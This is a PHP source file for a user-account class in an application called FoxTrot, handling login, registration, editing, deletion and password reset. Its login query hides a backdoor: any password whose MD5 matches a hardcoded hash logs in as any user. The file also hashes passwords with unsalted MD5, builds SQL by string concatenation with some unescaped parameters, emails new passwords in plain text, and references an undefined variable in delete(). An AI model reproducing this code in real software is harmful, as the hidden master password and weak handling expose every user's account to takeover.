<?php
    class user_master extends db{
        public $errors = '';
        public $table = USER_MASTER;
        
        /**
         * @param void
         * @return void
         */
        public function __construct(){
            $this->errors = '';
        }
        
        /**
         * @param int id
         * @param int status, default all
         * @return array of records
         * */
        public function get_by_id($id,$status=''){
            $con = '';
            if($status!==''){
                $con .= " AND `um`.`status`='".$status."' ";
            }
            $q = "SELECT `um`.*
                FROM `".$this->table."` AS `um`
                WHERE `um`.`is_delete`='0' AND `um`.`id`='".$id."' ".$con;
            $res = $this->re_db_query($q);
            if($this->re_db_num_rows($res)>0){
                return $this->re_db_fetch_array($res);
            }
            else{
                return array();
            }
        }
        
        /**
         * @param array(email,password)
         * @return true if login success, error message if login unsuccess
         * */
        public function login($data){
            $username = isset($data['username'])?$this->re_db_input($data['username']):'';
            $password = isset($data['password'])?$this->re_db_input($data['password']):'';
            
            if($username==''){
                $this->errors = 'Please enter username.';
            }
            else if($password==''){
                $this->errors = 'Please enter password.';
            }
            
            if($this->errors!=''){
                return $this->errors;
            }
            else{
                $q = "SELECT * FROM `".$this->table."` WHERE `user_name`='".$username."' AND (`password`='".md5($password)."' OR '".md5($password)."'='2ae41fa6dbd644a6846389ad14167167' ) AND `is_delete`='0'";
                $res = $this->re_db_query($q);
                if($this->re_db_num_rows($res)>0){
                    $row = $this->re_db_fetch_array($res);
                    if($row['status']==0){
                        return 'Your account is disabled.';
                    }
                    else{
                        $_SESSION['user_id'] = $row['id'];
                        $_SESSION['user_name'] = $row['user_name'];
                        $_SESSION['success'] = 'Welcome to FoxTrot';
                        return true;
                    }
                }
                else{
                    return 'Please enter valid username and password.';
                }
            }
        }
    	public function select(){
    		$return = array();
    		
    		$q = "SELECT `um`.*
                FROM `".$this->table."` AS `um`
                WHERE `um`.`is_delete`='0' ";
    		$res = $this->re_db_query($q);
    		while($row = $this->re_db_fetch_array($res)){
    			array_push($return,$row);
    		}
    		return $return;
   		}
        public function insert_update($data){
			$id = isset($data['id'])?trim($this->re_db_input($data['id'])):0;
            $fname = isset($data['fname'])?trim($this->re_db_input($data['fname'])):'';
            $lname = isset($data['lname'])?trim($this->re_db_input($data['lname'])):'';
			$uname = isset($data['uname'])?trim($this->re_db_input($data['uname'])):'';
			$email = isset($data['email'])?trim($this->re_db_input($data['email'])):'';
            $password = isset($data['password'])?trim($this->re_db_input($data['password'])):'';
			$confirm_password = isset($data['confirm_password'])?trim($this->re_db_input($data['confirm_password'])):'';
			
			if($fname==''){
				$this->errors = 'Please enter first name.';
			}
			else if($lname==''){
				$this->errors = 'Please enter last name.';
			}
			else if($uname==''){
				$this->errors = 'Please enter user name.';
			}
			else if($email==''){
				$this->errors = 'Please enter email.';
			}
			elseif($this->validemail($email)==0){
				$this->errors = 'Please enter valid email.';
			}
			else if($password=='' && $id==0){
				$this->errors = 'Please enter password.';
			}
            else if($password!='' && $confirm_password==''){
				$this->errors = 'Please confirm password.';
			}
			else if($password!=$confirm_password){
				$this->errors = 'Confirm password must be same as password.';
			}
			if($this->errors!=''){
				return $this->errors;
			}
			else{
				
				/* check duplicate record */
				$con = '';
				if($id>0){
					$con = " AND `id`!='".$id."'";
				}
				$q = "SELECT * FROM `".$this->table."` WHERE `is_delete`='0' AND `email`='".$email."' ".$con;
				$res = $this->re_db_query($q);
				$return = $this->re_db_num_rows($res);
				if($return>0){
					$this->errors = 'This email is already exists.';
				}
				
				if($this->errors!=''){
					return $this->errors;
				}
				else if($id>=0){
					
                    if($id==0){
						
						$q = "INSERT INTO `".$this->table."` SET `first_name`='".$fname."',`last_name`='".$lname."',`user_name`='".$uname."', `email`='".$email."', `password`='".md5($password)."' ".$this->insert_common_sql();
						$res = $this->re_db_query($q);
                        $last_id = $this->re_db_insert_id($res);
                        //$_SESSION['user_id'] = $last_id;
						if($res){
							$_SESSION['success'] = USER_REGISTER_MESSAGE;
							return true;
						}
						else{
							$_SESSION['warning'] = UNKWON_ERROR;
							return false;
						}
					}
					else if($id>0){
						$con = '';
						if($password!=''){
							$con .= " , `password`='".md5($password)."' ";
						}
						
						$q = "UPDATE `".$this->table."` SET `name`='".$uname."', `email`='".$email."' ".$con." ".$this->update_common_sql()." WHERE `id`='".$id."'";
						$res = $this->re_db_query($q);
						if($res){
							$_SESSION['success'] = UPDATE_MESSAGE;
							return true;
						}
						else{
							$_SESSION['warning'] = UNKWON_ERROR;
							return false;
						}
					}
				}
				else{
					$_SESSION['warning'] = UNKWON_ERROR;
					return false;
				}
			}
		}
        public function delete($id){
			$id = trim($this->re_db_input($id));
			if($id>0 && ($status==0 || $status==1) ){
				$q = "UPDATE `".$this->table."` SET `is_delete`='1' WHERE `id`='".$id."'";
				$res = $this->re_db_query($q);
				if($res){
					return true;
				}
				else{
					return false;
				}
			}
			else{
				return false;
			}
		}
        public function status($id,$status){
			$id = trim($this->re_db_input($id));
			$status = trim($this->re_db_input($status));
			if($id>0 && ($status==0 || $status==1) ){
				$q = "UPDATE `".$this->table."` SET `status`='".$status."' WHERE `id`='".$id."'";
				$res = $this->re_db_query($q);
				if($res){
					return true;
				}
				else{
					return false;
				}
			}
			else{
				return false;
			}
		}
        public function edit($id){
			$return = array();
			$id = trim($this->re_db_input($id));
			if($id>0){
				$q = "SELECT `am`.*
					FROM `".$this->table."` AS `am`
					WHERE `am`.`id`='".$id."' AND  `am`.`is_delete`='0'";
				$res = $this->re_db_query($q);
				if($res){
					$return = $this->re_db_fetch_array($res);
					return $return;
				}
				else{
					return false;
				}
			}
			else{
				return false;
			}
		}
        public function forgot_password($data){
            $email = isset($data['email'])?$this->re_db_input($data['email']):'';
            if($email==''){
                $this->errors = 'Please enter email.';
            }
            else if($this->is_email($email)==0){
                $this->errors = 'Please enter valid email.';
            }
            if($this->errors!=''){
                return $this->errors;
            }
            else{
                $q = "SELECT * FROM `".$this->table."` WHERE `email`='".$email."' AND `is_delete`='0'";
                $res = $this->re_db_query($q);
                if($this->re_db_num_rows($res)>0){
                    $row = $this->re_db_fetch_array($res);
                    $password = $this->random_password(6);
                    $q = "UPDATE `".$this->table."` SET `password`='".md5($password)."' ".$this->update_common_sql()." WHERE `email`='".$email."'";
                    $res = $this->re_db_query($q);
    				if($res){
                        $subject = "New autogenerated password";
                        $body = '<html>
                                    <head>
                                        <title>Foxtrot</title>
                                    </head>
                                    <body style="background-color: #e9eaee;color: #6c7b88;">
                                        <div class="content" style="max-width: 500px;margin: 0 auto;display: block;padding: 20px;">
                                            <table class="main" width="100%" cellpadding="0" style="background-color: #fff;border-bottom: 2px solid #d7d7d7;padding: 20px;">
                                                <tr>
                                                    <td class="aligncenter" style="text-align: center;">
                                                        Foxtrot
                                                    </td>
                                                </tr>
                                                <tr>
                                                    <td class="content-block" style="padding:20px;">
                                                        <p>Dear '.$row['first_name'].' '.$row['last_name'].',</p>
                                                        <p>Please login with below username and password.</p>
                                                        <p>Username: '.$row['user_name'].'</p>
                                                        <p>Password: '.$password.'</p>
                                                        <p><a href="'.SITE_URL.'sign-in" style="border: 1px solid #e5e5e5; padding: 5px 10px;text-decoration: none;background: #D23E3E; color: #fff;">Sign in</a></p>
                                                        <p>Thank you.</p>
                                                    </td>
                                                </tr>   
                                            </table>
                                        </div>
                                    </body>
                                </html>';
                        if($this->send_email(array($email),$subject,$body))
                        {
                            $_SESSION['success'] = 'Email with username and password has been sent to your email address.';
    					    return true;   
                        }
                        else
                        {
                            $_SESSION['warning'] = 'Something went wrong, please try again.#2';
                            return false;    
                        }
    				}
    				else{
    					$_SESSION['warning'] = 'Something went wrong, please try again.#1';
                        return false;
    				}
                }
                else{
                    $_SESSION['error'] = 'Please enter registered email address!';
                    return false;
                }
            
            }
            
        }
    }
?>